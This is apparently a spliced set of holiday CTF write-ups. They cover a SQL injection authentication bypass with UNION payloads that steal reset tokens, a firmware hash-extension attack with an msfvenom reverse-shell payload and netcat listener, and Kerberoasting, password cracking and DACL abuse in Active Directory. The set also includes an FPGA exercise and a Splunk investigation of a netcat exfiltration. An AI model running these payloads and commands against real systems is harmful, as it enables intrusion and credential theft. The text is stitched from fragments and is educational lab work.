It just doesn't seem right. Why can't we work together with Santa and the elves instead of trying to beat them? But, I do have an Objective for you. We're getting ready to launch a new website for Frost Tower, and the big guy has charged me with making sure it's secure. Hints \u2693\ufe0e SQL Injection with Source When you have the source code, API documentation becomes tremendously valuable . Solution \u2693\ufe0e This challenge is an example of a white-box pentest and solving it requires finding and exploiting 2 vulnerabilities in the source code . First we need to bypass authentication, followed by an SQL injection attack against a vulnerable URL endpoint. Ribb Bonbowford's hint literally tells us which 2 Node.js modules we need to focus on for each step, express-session and mysql . Understanding the application logic Having access to the source code gives us full insight into the web application's internal logic and understanding the application flow is an important part of solving the challenge. While we could submit the form on the Frost Tower website to determine that the actual site is located at /testsite , the same information can also be found by analyzing the server.js source code, which we'll be doing throughout this write-up. Bypassing authentication \u2693\ufe0e When a user successfully logs in using a POST request to /login , the session.uniqueID variable is assigned a value, enabling access to backend endpoints like /dashboard which wrap their logic in an if (session.uniqueID) {} statement. There's a flaw in the /postcontact endpoint logic, however. Using the contact form form to submit the same email address more than once will result in the SQL query on line 141 to return the email that's already in the uniquecontact table and assign the submitted email to session.uniqueID (line 151), fullfilling the requirement set by endpoints like /dashboard . Submitting the same email twice via the contact form and accessing the /dashboard endpoint confirms the vulnerability. SQL injection \u2693\ufe0e Now that the web application considers us authenticated we can take a closer look at all the server.js code that's wrapped in if (session.uniqueID) {} statements. This reveals an additional vulnerability in the /detail endpoint, which contains logic to parse a comma-separated list of IDs in order to build a database query that will retrieve multiple uniquecontact records at once. On line 207 the code contains a raw() method which, per the mysql API documentation , \"will skip all escaping functions when used, so be careful when passing in unvalidated input\" . Honestly, this sounds more like a hint than a warning. Escaping query values The mysql Node.js library provides several methods like mysql.escape() , connection.escape() , and pool.escape() which can be used to escape user-provided data and help prevent SQL injection attacks. In addition, ? characters can also be used as placeholders for any values that should be escaped. However, the mysql.raw() method will leave the data un-touched even when it's used in combination with a ? placeholder. In other words, the escape() method used in the tempCont.escape(m.raw(ids[i])); statement will have no impact on the object returned by the raw() method. By using an SQL injection UNION attack we can combine the results from the uniquecontact SELECT statement on line 198 with whatever we'd like to retrieve from another table, as long as each individual query returns the same number of columns and their data types are compatible. As a request for ID 0 using /detail/0 returns no records, the result of a UNION statement will only contain the data from the other table. This keeps things nice and clean. There is one caveat though. Commas will be stripped out as the input string is converted to a list of IDs by the split() method on line 204, meaning our SQL query can't contain that particular character. Luckily for us, others already solved that problem and SELECT 1,2,3 can be rewritten as SELECT * FROM (SELECT 1)F1 JOIN (SELECT 2)F2 JOIN (SELECT 3)F3 . While it might be tempting to go for admin access, the goal is to find Jack's TODO list, so craft a query that lists all the tables. In the example below, the table_name query statement is at the same column index as the full_name column in the uniquecontact table, which will result in the detail.ejs template rendering it front and center using <h1><%= encontact.full_name %></h1> . SQL injection input string 0 , 0 union select * from (( select 1 ) F1 join ( select table_name from information_schema . tables where table_schema = 'encontact' ) F2 join ( select 3 ) F3 join ( select 4 ) F4 join ( select 5 ) F5 join ( select 6 ) F6 join ( select 7 ) F7 ); -- Code-generated SQL query SELECT * FROM uniquecontact WHERE id = 0 OR id = 0 union select * from (( select 1 ) F1 join ( select table_name from information_schema . tables where table_schema = 'encontact' ) F2 join ( select 3 ) F3 join ( select 4 ) F4 join ( select 5 ) F5 join ( select 6 ) F6 join ( select 7 ) F7 ); -- OR id=? Using the SQLi string above as input for the /detail endpoint gives us the information we're looking for. The same technique can now be repeated to retrieve the column information from the todo table (i.e., id , note , completed ), followed by the notes themselves. To help automate these final steps we can create a script that takes our desired SQL query as input, inserts it into the SQLi UNION attack string, creates an authenticated session by submitting the contact form twice using the same email, and then performs a GET request against the /detail endpoint using the crafted SQLi string as input. query_db.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 #!/usr/bin/env python import click import requests from bs4 import BeautifulSoup def authenticate ( sess : requests .

Get full admin emails 0 , 0 union select * from (( select 1 ) F1 join ( select email from users where user_status = 1 ) F2 join ( select 3 ) F3 join ( select 4 ) F4 join ( select 5 ) F5 join ( select 6 ) F6 join ( select 7 ) F7 ); -- Next, use one of the email addresses (e.g., root@localhost ) to initiate a password reset .

Retrieve reset token 0 , 0 union select * from (( select 1 ) F1 join ( select token from users where email = 'root@localhost' ) F2 join ( select 3 ) F3 join ( select 4 ) F4 join ( select 5 ) F5 join ( select 6 ) F6 join ( select 7 ) F7 ); -- Making a request to /forgotpass/token/<token> will allow us to set a new password for the root@localhost account and log in.

Hints \u2693\ufe0e FPGA Talk Prof. Qwerty Petabyte is giving a lesson about Field Programmable Gate Arrays (FPGAs). FPGA for Fun There are FPGA enthusiast sites . Solution \u2693\ufe0e Welcome message EE/CS 302 - Exercise #4 Hello, students! In exercise #4, we continue our FPGA journey, documenting the creation of the sound chip for this holiday season's new Kurse 'em Out Karen doll. Our goal is to make the doll say its trademark phrase. But, as I always tell you in class, we must walk before we run. Before the doll can say anything, we must first have it make noise. In this exercise you will design an FPGA module that creates a square wave tone at a variable frequency. Creating a square wave output takes our clock signal (which is also a square wave) and uses a counter to divide the clock to match the desired frequency. One tricky problem that we'll encounter is that Verilog (v1364-2005) doesn't have a built-in mechanism to round real numbers to integers, so you'll need to devise a means to do that correctly if you want your module to match frequencies accurately. Good luck and always remember: If $rtoi(real_no * 10) - ($rtoi(real_no) * 10) > 4, add 1 Interval count \u2693\ufe0e The solution follows both the blinky light example shown in Prof. Qwerty Petabyte's presentation as well as the music box example provided as a hint. The biggest difference is that our FPGA program needs to be able to generate any given output frequency. The looping and counting logic is largely the same however, except for 2 caveats. Square waves have a 50% duty cycle As noted by Prof. Petabyte towards the end of his presentation , a square wave should have a half or 50% duty cycle, which means the high and low state of each cycle has to be of equal duration. In other words, if we want to generate a square output wave then we will need to count the same number of rising edges on the input clock before changing from high to low as we need to count before switching back from low to high. The main problem we need to solve is determining how many rising edges we need to count before flipping the state of the output pin (i.e., high to low, low to high). Since the output frequency can vary, we need to come up with a suitable formula to calculate the interval. The music box example provides the answer, but let's use the image below to illustrate what we need to do. Minor mistake in Prof. Petabyte's presentation The final slide in Prof. Petabytes's presentation contains a minor mistake. The LED in the blink module example wasn't being driven by a 2 Hz square wave. It was in fact a 0.5 Hz square wave, which the professor was kind enough to confirm . Such an awesome elf! Let's say we want to go from a 4 Hz (i.e., 4 rising edges per second) input to a 1 Hz output (i.e., 1 rising edge per second). First, we need to wait and count 2 rising edges from the 4 Hz signal before changing the output signal from high to low. Then we need to count 2 more before going back to high. In other words, between every transition of the output signal we need to count to 2. If instead we're trying to go from 8 Hz to 4 Hz we have to count to 1 before each transition. In more general terms, to go from X rising edges per second (or Hz) to Y rising edges per second (or Hz) we need to count to X/Y/2 before flipping the state of the output. For the first example this means 4/1/2 or count to 2. For the second example this translates to 8/4/2 or count to 1. The program... and some caveats \u2693\ufe0e Now that we know how to calculate the interval length we can write an FPGA program that counts up to interval or an alternative version that counts down from interval , but as was noted previously there's 2 caveats. The first has to do with the interval calculation itself. To retain the highest possible precision all math should be performed with floats (lines 29-30) and the conversion to an integer should only be done on the final calculated result, using the rounding tip provided by Prof. Petabyte. Secondly, we need to ensure that a rising edge on the rst pin doesn't take away one count from the first loop, as indicated by the red highlight in the image above. If a reset sets counter back to the same value our loop does (i.e., 1) then our first iteration will be one short by counting from 2 to interval . A reset needs to put us in the green state and change counter to 0 (line 42) in order for the first loop to also count from 1 to interval . kurseem-out-karen-countup.verilog 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 // Note: For this lab, we will be working with QRP Corporation's CQC-11 FPGA. // The CQC-11 operates with a 125MHz clock. // Your design for a tone generator must support the following // inputs/outputs: // (NOTE: DO NOT CHANGE THE NAMES.

Hash Extension Attacks Hash Extension Attacks can be super handy when there's some type of validation to be circumvented. Printer Firmware When analyzing a device, it's always a good idea to pick apart the firmware. Sometimes these things come down Base64-encoded. Solution \u2693\ufe0e Reverse the firmware \u2693\ufe0e We first need to understand what a firmware file looks like. So, download the current firmware from the printer website , copy out the data in the JSON file's firmware field, Base64 decode the data, and save it to its own firmware-export.bin file (line 1). The file command tells us we're working with a ZIP file (line 2). Unpacking the archive reveals a firmware.bin executable (lines 3-4). Parsing JSON data in the command line jq is a handy command line JSON processor. You can use it to slice, filter, and transform structured JSON data with the same ease that tools like sed , awk , and grep let you manipulate text. jq isn't a requirement for this challenge, but it helps to turn the whole extraction process into an easy-to-use one-liner. Extracting the firmware 1 2 3 4 5 cat firmware-export.json | jq -r '.firmware' | base64 -D > firmware-export.bin file firmware-export.bin # indicates this is a ZIP file mv firmware-export.bin firmware-export.zip # rename for clarity unzip firmware-export.zip # unpack archive file firmware.bin # indicates this is a 64-bit ELF binary To create a valid firmware file we simply reverse the steps described above. Create an executable called firmware.bin , compress the file, and copy the Base64 encoded archive data to the firmware field in the JSON file. The last step is to add a valid signature to the JSON file, but unfortunately we're missing the necessary secret key to calculate that value. Ensuring signature validation \u2693\ufe0e When uploading a firmware file, the printer will validate the uploaded signature by calculating a new signature value using a secret key only it knows. If the calculated signature matches the value in the uploaded JSON file, the firmware is considered valid and the printer will execute the enclosed firmware.bin file. If the signature is invalid, we get the following error. Building a new firmware file means we also need a new signature, but how do we do that without the secret key? That question is answererd by the Hash Extension Attacks hint, which also provides a handy Hash Extender tool to automate the attack! blog.skullsecurity.org An application is susceptible to a hash length extension attack if it prepends a secret value to a string, hashes it with a vulnerable algorithm, and entrusts the attacker with both the string and the hash, but not the secret. Then, the server relies on the secret to decide whether or not the data returned later is the same as the original data. It turns out, Even though the attacker doesn't know the value of the prepended secret, he can still generate a valid hash for {secret || data || attacker_controlled_data} ! This is done by simply picking up where the hashing algorithm left off; it turns out, 100% of the state needed to continue a hash is in the output of most hashing algorithms! We simply load that state into the appropriate hash structure and continue hashing. Since we're appending our payload to valid firmware data in order to execute the Hash Extension attack, we also don't need to worry about which of the 2 ZIP archives will be unpacked. Ruby Cister notes that \"if you append multiple files of that type, the last one is processed\" , which ensures our firmware.bin will be extracted and executed by the printer after successful validation. Creating the payload \u2693\ufe0e For the payload we can keep it simple by using a shell script or binary that copies /var/spool/printer.log to /app/lib/public/incoming/ , making it accessible from https://printer.kringlecastle.com/incoming/ . Name the payload firmware.bin , make it executable using chmod +x firmware.bin , and compress the file using zip payload-script.zip firmware.bin . We now have the original firmware-export.zip we extracted previously and our own payload-script.zip , which we both use as input for Hash Extender to create the final combined payload and valid signature. Compiling Hash Extender The Hash Extender C code first needs to be compiled into a binary before we can use it. Clone the Hash Extender repository , change into the hash_extender directory using cd hash_extender , and finally run make to compile the project into a single hash_extender binary. The xxd command will create a hex dump of our payload-script.zip file and xargs will then take that data and make it available to hash_extender as append_data . As an alternative to these commands you could also update the source code to support an --append-file parameter that takes a filename as input instead of the raw data. Using --output-data-format fancy | head -n -3 | tail -n +5 | xxd -r | base64 we can extract the hex data from the output, convert it to binary, and Base64 encode it. Putting it all together \u2693\ufe0e Use the new signature and Base64 data from the previous step to create a new firmware-payload-script.json file and upload it to the printer. Once the upload finishes the printer will validate the JSON, decode the enclosed Base64 data, validate the signature, unpack the last archive which contains our payload, and execute our firmware.bin shell script which copies /var/spool/printer.log to /app/lib/public/incoming/crahan_printer.log . We can now download the printer log file from https://printer.kringlecastle.com/incoming/crahan_printer_new.log . Answer Troll_Pay_Chart.xlsx Reverse shell The example above uses a very simple payload to copy the file we need to a location we can access it from, but you can also solve this challenge by using a reverse shell as the payload. Only the payload creation part is different. All other steps remain exactly the same as outlined above. Create a simple reverse TCP shell payload using MSFvenom by running msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=9085 -f elf > firmware.bin . Next, set up a listener using nc -lvp 9085 that will accept the incoming reverse shell connection. Finally, upload the new firmware file and watch the connection be established. In /app/lib/app.rb you'll find the mybigsigningkey! secret key which is used by the printer to validate the firmware signature.

We can break out of the Python grading application and start a Bash shell by first pressing Ctrl + d , followed by executing import os; os.system('/bin/bash') . Permanently change the login shell to /bin/bash using chsh to prevent having to go through all of this again at the next login. Information gathering and host enumeration \u2693\ufe0e Preinstalled tools The Linux host already provides a lot of useful tools like powershell , nmap , smbclient , and some scripts from the Impacket toolkit. If any additional tools or scripts are needed beyond the ones already present, copy them over using scp -P 2222 <filename> <username>@grades.elfu.org: . First order of business is to enumerate, enumerate, enumerate ! We need gather as much network and host information as possible to better understand what the environment looks like. ifconfig tells us our IP address is 172.17.0.2, so run an nmap ping scan against the /24 subnet using nmap -sn 172.17.0.0/24 to see what hosts in our immediate vicinity respond back. Including our own host, 5 devices are up and running with IP addresses ranging from 172.17.0.1 to 172.17.0.5. Next, perform a port scan against all hosts with nmap 172.17.0.1-5 and save the scan results for future reference. The volume and types of open ports on host 172.17.0.3 are definitely interesting. Copy enum4linux.pl to the host and run ./enum4linux.pl 172.17.0.3 to gather even more details like file share information, which can also be viewed using smbclient -L 172.17.0.3 . While definitely interesting, host 172.17.0.3 is not the domain controller and any kerberoasting attacks against it will fail. To find the domain controller ping the elfu.local domain assigned to our host, which returns a response from 10.128.1.53 or hhc21-windows-dc.c.holidayhack2021.internal . The windows-dc part of the hostname is a good indicator this is the DC. Kerberoasting service accounts and hash cracking \u2693\ufe0e With the domain controller found, we can start following Chris Davis' KringleCon talk . Impacket's GetUserSPNs.py script is already available in /usr/local/bin , so run GetUserSPNs.py -outputfile spns.txt -dc-ip 10.128.1.53 elfu.local/bvofqrjnps against the domain controller in order to grab some service account hashes. Replace bvofqrjnps with your own account name. The spns.txt file now contains a single hash for the elfu.local/elfu_svc service account which we can crack using hashcat . As cracking passwords is resource intensive, we'll use the hint about CeWL to generate a custom wordlist based on the content from the ElfU Portal website, which contains a few interesting words inside an HTML comment block. Generate the wordlist using cewl --with-numbers https://register.elfu.org/register > elfu_pwlist.txt . Together with the OneRuleToRuleThemAll.rule mangling rules files, we can now run hashcat -m 13100 -r OneRuleToRuleThemAll.rule spns.txt elfu_pwlist.txt which reveals that the elfu.local/elfu_svc service account's password is Snow2021! . Retrieving stored credentials from scripts \u2693\ufe0e The elfu.local/elfu_svc service account credentials now allow us to log in to the elfu_svc_shr file share on 172.17.0.3, using smbclient //172.17.0.3/elfu_svc_shr -U elfu.local/elfu_svc . Download all the PowerShell scripts with mget * . One of the hints notes that \"Administrators often store credentials in scripts. These can be coopted by an attacker for other purposes!\" . Searching through all files with grep -i elfu *.ps1 reveals a GetProcessInfo.ps1 script that contains a PowerShell credentials object for an elfu.local\\remote_elf account. Intead of retrieving a process list from the domain controller using Invoke-Command , we can reuse the $aCred credentials object to open a remote PowerShell session to the host. Adding our account to the right domain group \u2693\ufe0e We finally made it onto the domain controller! Similar to the Frost Tower Website Checkup challenge though, we might be tempted to try and go for domain admin, but the goal is to find a secret sleigh research document. We already know there's a research_dep file share which might hold what we're looking for and a search for domain group names containing research reveals there is a Research Department group as well. Fun fact, our detailed information for host 172.17.0.3 already contained this information. Using one of Chris Davis' PowerShell snippets to read the Discretionary Access Control List (DACL) of the Research Department domain group tells us that the elfu.local\\remote_elf user, which we're logged in as, has WriteDACL permissions on that group. List DACL permissions 1 2 $ADSI = [ADSI] \"LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local\" $ADSI . psbase . ObjectSecurity . GetAccessRules ( $true , $true , [Security.Principal.NTAccount] ) Having writeDACL permissions means we can now give our elfu.local\\bvofqrjnps domain user GenericAll permission on the Research Department domain group and then use those additional permissions to add our account to that group. To do this we can use two more code snippets provided by Chris, making sure to replace $ldapConnString , $username , $password , and the domain name in $IdentityReference and $user with the proper values. Grant permission to bvofqrjnps Add bvofqrjnps to Research Department A final check with Get-ADPrincipalGroupMembership bvofqrjnps | select name confirms our account was added! Downloading the research document \u2693\ufe0e It might take a few minutes for the changes we made to propagate from the domain controller to host 172.17.0.3. But after some time we're able to use smbclient //172.17.0.3/research_dep -U elfu.local/bvofqrjnps to connect to the research_dep file share and retrieve the secret sleigh research document !

Looking only at his process launches as reported by Sysmon, record the most common git-related CommandLine that Eddie seemed to use. If you ignore the docker ps top result, the 4th sample Splunk search we're provided pretty much answers this question. To narrow down the results to just git-related command lines however, we can either use the Image or the CommandLine field (line 3). Splunk search query 1 2 3 4 5 index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational | where EventCode=1 and user=\"eddie\" | where Image like \"%git%\" | stats count by Image CommandLine | sort - count Answer git status Task 2 \u2693\ufe0e Question Looking through the git commands Eddie ran, determine the remote repository that he configured as the origin for the 'partnerapi' repo. The correct one! This question expands on the previous search query. We search for Sysmon Event ID 1 process creation events, but this time filter not only on binary names that match git but also require the command line to contain partnerapi (line 3). Inverting the sort order by using - _time puts the most recent and correct git remote add command at the top. Splunk search query 1 2 3 4 5 index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational | where EventCode=1 and user=\"eddie\" | where Image like \"%git%\" and CommandLine like \"%partnerapi%\" | sort - _time | table _time CommandLine Answer git@github.com:elfnp3/partnerapi.git Task 3 \u2693\ufe0e Question The 'partnerapi' project that Eddie worked on uses Docker. Gather the full docker command line that Eddie used to start the 'partnerapi' project on his workstation. Once again we can reuse much of the Splunk query we've been working with so far. Instead of looking for git commands however, we now pivot to docker commands (line 3). Sorting by process execution time returns an ordered timeline which tells us that the first docker command run after any activity related to partnerapi is docker compose up . Splunk search query 1 2 3 4 5 index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational | where EventCode=1 and user=\"eddie\" | where Image like \"%docker%\" or CommandLine like \"%partnerapi%\" | sort _time | table _time CommandLine Answer docker compose up Task 4 \u2693\ufe0e Question Eddie had been testing automated static application security testing (SAST) in GitHub. Vulnerability reports have been coming into Splunk in JSON format via GitHub webhooks. Search all the events in the main index in Splunk and use the sourcetype field to locate these reports. Determine the URL of the vulnerable GitHub repository that the elves cloned for testing and document it here. You will need to search outside of Splunk (try GitHub) for the original name of the repository. To answer this question we need to pivot to the github_json source type. Use the fields in the left sidebar to find a suitable candidate like repository.html_url . Clicking the field name will pop up a dialog containing all possible values. We already know about https://github.com/elfnp3/partnerapi , so we focus on the https://github.com/elfnp3/dvws-node repository which, upon closer inspection, appears to have been cloned from https://github.com/snoopysecurity/dvws-node . Answer https://github.com/snoopysecurity/dvws-node Task 5 \u2693\ufe0e Question Santa asked Eddie to add a JavaScript library from NPM to the 'partnerapi' project. Determine the name of the library and record it here for our workshop documentation. Back to Sysmon Event ID 1 process creation events we go! Searching for any command lines containing git commit or npm install (line 3) returns a timeline of relevant process activity, neatly sorted from oldest to newest. The log message in the final command provides the library name we're looking for, holiday-utils-js . Splunk search query 1 2 3 4 5 index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational | where EventCode=1 and user=\"eddie\" | search CommandLine IN (\"*git commit*\", \"*npm install*\") | sort _time | table _time CommandLine Answer holiday-utils-js Task 6 \u2693\ufe0e Question Another elf started gathering a baseline of the network activity that Eddie generated. Start with their search and capture the full process_name field of anything that looks suspicious. We switch from Sysmon Event ID 1 process creation events to Sysmon Event ID 3 network events. The only thing we have to change in the provided query is the final line and count by process_name instead of dest_ip and dest_port (line 5). Splunk search query 1 2 3 4 5 index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational | where EventCode=3 and user=\"eddie\" | where NOT dest_ip like (\"127.0.0.%\") | where NOT dest_port IN (22,53,80,443) | stats count by process_name Would you look at that! If it isn't the reverse shell's best buddy, netcat ! Answer /usr/bin/nc.openbsd Task 7 \u2693\ufe0e Question Uh oh. This documentation exercise just turned into an investigation. Starting with the process identified in the previous task, look for additional suspicious commands launched by the same parent process. One thing to know about these Sysmon events is that Network connection events don't indicate the parent process ID, but Process creation events do! Determine the number of files that were accessed by a related process and record it here. Now that we've identified suspicious activity we can expand our Splunk searches to all users and confirm this isn't happening on any other hosts. We start by searching for /usr/bin/nc.openbsd process details (line 3) and print the parent process ID. Splunk search query 1 2 3 4 index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational | where EventCode=1 | where Image=\"/usr/bin/nc.openbsd\" | table Image CommandLine ParentImage ParentProcessId Next, we use process ID 6788 to search for any other processes that have the same parent process ID (line 3). Splunk search query 1 2 3 4 index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational | where EventCode=1 | where ParentProcessId=6788 | table Image CommandLine ParentProcessId It looks like 6 different files were accessed using a single cat command. Answer 6 Task 8 \u2693\ufe0e Question Use Splunk and Sysmon Process creation data to identify the name of the Bash script that accessed sensitive files and (likely) transmitted them to a remote IP address. The final task is similar to the previous one. We need to move up the process tree by alternating our searches between finding the parent process ID for the current process and using that value as the input for the next search, and the next, etc. Start with process ID 6788 from the previous task (line 3). Splunk search query 1 2 3 4 index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational | where EventCode=1 | where ProcessId=6788 | table Image ProcessId CommandLine ParentImage ParentProcessId Use process ID 6784 as input for the next search and grab its parent process ID (line 3). Splunk search query 1 2 3 4 index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational | where EventCode=1 | where ProcessId=6784 | table Image ProcessId CommandLine ParentImage ParentProcessId A final search for process ID 6783 gives us the preinstall.sh Bash script we're looking for! Splunk search query 1 2 3 4 index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational | where EventCode=1 | where ProcessId=6783 | table Image ProcessId CommandLine ParentImage ParentProcessId Answer preinstall.sh Gee whiz, we made it! \u2693\ufe0e Answer whiz","title":"Splunk!"},{"location":"objectives/o9/#splunk","text":"Difficulty : Direct link : splunk website Terminal hint : Yara Analysis","title":"Splunk!"},{"location":"objectives/o9/#objective","text":"Request Help Angel Candysalt solve the Splunk challenge in Santa's great hall.
